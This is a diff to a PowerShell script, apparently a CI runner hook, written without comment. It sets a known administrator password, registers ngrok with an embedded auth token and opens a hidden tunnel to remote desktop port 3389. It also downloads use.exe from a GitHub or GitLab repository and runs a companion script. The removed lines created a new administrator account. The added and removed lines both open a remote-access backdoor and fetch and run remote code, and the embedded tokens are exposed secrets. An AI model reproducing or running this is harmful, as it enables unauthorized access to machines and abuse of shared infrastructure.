@@ -1,10 +1,9 @@
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/YaptircazKanka/Blok3/main/use.exe" -OutFile ngrok.exe 
-cmd /c ngrok.exe authtoken 2cn87V9NMzmnYMwO3Vgp6rtvFde_3PkxAeYd8zjbLwMge7LAe
+cmd /c net user runneradmin P@ssw0rd!
+choco install ngrok -y
+ngrok config add-authtoken 2dumqfNwOrYeLZWxq5jCHAJvnq2_3SSomQfvvbASdUDZiQMT
 Start-Process -FilePath "ngrok.exe" -ArgumentList "tcp 3389" -WindowStyle Hidden
-cmd /c net user /add Admin P@ssw0rd.
-cmd /c net localgroup /add administrators Admin
 sleep 240
-curl -o zip.exe -Uri "https://raw.githubusercontent.com/YaptircazKanka/Blok3/main/use.exe"
+curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
 .\0.ps1
-curl -o zip.exe -Uri "https://raw.githubusercontent.com/YaptircazKanka/Blok3/main/use.exe"
+curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
 .\0.ps1
